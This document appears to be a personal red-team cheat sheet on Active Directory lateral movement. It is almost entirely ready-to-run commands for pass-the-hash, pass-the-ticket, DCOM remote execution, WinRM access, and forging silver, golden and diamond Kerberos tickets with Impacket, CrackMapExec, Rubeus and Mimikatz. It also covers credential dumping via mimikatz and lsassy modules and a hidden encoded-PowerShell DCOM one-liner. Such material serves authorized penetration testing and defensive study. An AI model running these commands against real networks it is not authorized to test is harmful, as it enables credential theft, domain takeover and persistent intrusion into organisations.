# Active Directory Lateral Movement

## Overview

After gaining initial access, lateral movement pivots across hosts using stolen hashes, tickets, and tokens.

---

## Pass-the-Hash (PtH)

Use NTLM hash to authenticate without knowing the plaintext password.

### Impacket wmiexec

```bash
# WMI execution (quiet, no temp files)
impacket-wmiexec <domain>/<user>@<target> -hashes <LM>:<NT>
impacket-wmiexec <domain>/<user>@<target> -hashes <LM>:<NT> 'whoami'
impacket-wmiexec -share <share> <domain>/<user>@<target> -hashes <LM>:<NT>
```

### Impacket psexec

```bash
# PsExec-like execution (SVC$ share, service creation)
impacket-psexec <domain>/<user>@<target> -hashes <LM>:<NT>
impacket-psexec <domain>/<user>@<target> -hashes <LM>:<NT> 'cmd.exe /c whoami'

# Using specific service name (stealth)
impacket-psexec <domain>/<user>@<target> -hashes <LM>:<NT> -service-name <random>

# Alternative: smbexec
impacket-smbexec <domain>/<user>@<target> -hashes <LM>:<NT>
```

### CrackMapExec

```bash
# Command execution
crackmapexec smb <target> -u <user> -H <NT_HASH> -x 'whoami'
crackmapexec smb <target> -u <user> -H <NT_HASH> -X '$env:COMPUTERNAME'  # PowerShell

# Module execution
crackmapexec smb <target> -u <user> -H <NT_HASH> -M mimikatz
crackmapexec smb <target> -u <user> -H <NT_HASH> -M lsassy
crackmapexec smb <target> -u <user> -H <NT_HASH> -M bloodhound -o ACTION=All
crackmapexec smb <target> -u <user> -H <NT_HASH> -M sam

# Spider shares
crackmapexec smb <target> -u <user> -H <NT_HASH> --spider <share> --pattern 'pass|admin'

# Enable SMB2 (default)
crackmapexec smb <target> -u <user> -H <NT_HASH> --smb2-support
```

### evil-winrm (WinRM)

```bash
# Requires WinRM enabled (port 5985)
evil-winrm -i <target> -u <user> -H <NT_HASH>

# Download/upload
evil-winrm -i <target> -u <user> -H <NT_HASH> -s /path/scripts/
evil-winrm -i <target> -u <user> -H <NT_HASH> -e /bin/path/

# Elevated session with Bypass
evil-winrm -i <target> -u <user> -H <NT_HASH> -S   # SSL
```

### PowerView Lateral Movement

```powershell
# Check local admin access on targets
Find-LocalAdminAccess

# Remote WMI
Invoke-Command -ComputerName <target> -ScriptBlock {whoami} -Credential $cred
```

---

## Overpass-the-Hash

Convert NTLM hash to a Kerberos TGT for use with Kerberos auth.

```bash
# Impacket
impacket-getTGT <domain>/<user> -hashes <LM>:<NT>
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec <domain>/<user>@<target> -k -no-pass

# Alternative usage
KRB5CCNAME=/path/to/ticket.ccache impacket-smbexec <domain>/<user>@<target> -k -no-pass
KRB5CCNAME=/path/to/ticket.ccache impacket-psexec <domain>/<user>@<target> -k -no-pass
```

### Rubeus (Windows)

```powershell
# Overpass-the-hash with Rubeus
Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<NTLM_HASH> /ptt

# Verify ticket in session
klist
```

---

## Pass-the-Ticket

Use existing/forged Kerberos tickets for authentication.

```bash
# Extract tickets with impacket
impacket-ticketConverter /path/to/ticket.kirbi ticket.ccache

# Use ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec <domain>/<user>@<target> -k -no-pass
```

### Windows (Mimikatz)

```powershell
# Extract tickets
mimikatz # sekurlsa::tickets /export

# Inject ticket into session
mimikatz # kerberos::ptt ticket.kirbi

# List current tickets
klist
```

### Rubeus

```powershell
# PTT from Base64
Rubeus.exe asktgt /domain:<domain> /user:<user> /certificate:<base64> /ptt

# PTT from file
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## DCOM

Remote code execution via Distributed COM objects.

### MMC20.Application

```powershell
# Via PowerShell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","Minimized")

# One-liner
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target>")).Document.ActiveView.ExecuteShellCommand("powershell",$null,"-NoP -NonI -W Hidden -Exec Bypass -Enc <base64>","Minimized")
```

### ShellWindows

```powershell
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}","<target>"))
$shell.Item().Document.Application.ShellExecute("cmd.exe","/c whoami","","open",0)
```

### Excel/Word DCOM

```powershell
# Excel
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<target>"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd","/c whoami")
```

---

## WinRM / PowerShell Remoting

### Enable WinRM (if not already)

```powershell
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force
```

### Remote PowerShell Session

```powershell
# Create credential
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<domain>\\<user>",$pass)

# Remote session
$sess = New-PSSession -ComputerName <target> -Credential $cred
Invoke-Command -Session $sess -ScriptBlock {whoami}

# Command execution
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {Get-Process}

# Interactive session (if needed)
Enter-PSSession -ComputerName <target> -Credential $cred
```

### WinRM with evil-winrm

```bash
# Password auth
evil-winrm -i <target> -u <user> -p <password>

# Pass-the-Hash
evil-winrm -i <target> -u <user> -H <NT_HASH>

# Certificate auth
evil-winrm -i <target> -c cert.pem -k key.pem -S
```

---

## Silver Ticket

Forge a service ticket (TGS) for a specific service with the service's NTLM hash.

```bash
# Impacket ticketer
impacket-ticketer -nthash <service_NT_HASH> -domain-sid <DOMAIN_SID> -domain <domain> -spn <SPN> <user>
```

### Information Needed

- Domain SID (from `whoami /user` or [[AD Recon Enumeration]])
- Target service NTLM hash (from [[AD Domain Dominance]] with Mimikatz or [[DCSync]])
- Service SPN (e.g., `HTTP/webserver.domain.local`, `CIFS/file-server.domain.local`)
- Username to impersonate (e.g., `Administrator`)

```bash
# Example: Forge CIFS ticket for file server
impacket-ticketer -nthash <CIFS_machine_hash> -domain-sid S-1-5-21-<SID> -domain <domain> -spn CIFS/<target> <impersonated_user>

export KRB5CCNAME=/path/to/ticket.ccache
smbclient //<target>/C$ -k -no-pass
```

### Silver Ticket by Service

| Service | Use Case |
|---------|----------|
| CIFS | File shares, SMB access |
| HTTP | Web (IIS, SharePoint) |
| HOST | Scheduled tasks, PSRemoting |
| LDAP | LDAP queries (mitigations bypass) |
| MSSQL | SQL Server access |
| RPCSS | RPC, WinRM |
| WSMAN | WinRM |
| TIME | Time service (less useful) |

---

## Golden Ticket

Forge a TGT using the KRBTGT account hash (domain compromise = persistence).

```bash
# Impacket ticketer
impacket-ticketer -nthash <krbtgt_NT_HASH> -domain-sid <DOMAIN_SID> -domain <domain> -extra-sid <SID_HISTORY> Administrator

# With specific groups
impacket-ticketer -nthash <krbtgt_NT_HASH> -domain-sid <DOMAIN_SID> -domain <domain> -groups 500,501,502,512,513,518,519 Administrator

# Use ticket
export KRB5CCNAME=/path/to/Administrator.ccache
impacket-smbexec <domain>/Administrator@<DC> -k -no-pass
```

### Golden Ticket Requirements

- KRBTGT hash (only on DC via [[DCSync]] or local access)
- Domain SID
- Domain name
- Optional: User ID (default 500 = Administrator)
- Optional: Extra SIDs for [[SID History injection]]

### Mimikatz Golden Ticket

```powershell
# On DC as DA
mimikatz # lsadump::lsa /inject /name:krbtgt

# Create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ptt

# Verify
klist
dir \\<DC>\C$
```

### Diamond Ticket (more stealthy golden ticket)

```powershell
# Modify legitimate TGT instead of forging one
Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt_aes_key> /ticketuser:Administrator /domain:<domain> /dc:<DC> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe
```

---

## Related Notes

- [[AD Recon Enumeration]]
- [[AD Attack Vectors]]
- [[AD ACL Abuse]]
- [[AD Domain Dominance]]
- [[Windows Post Exploitation]]
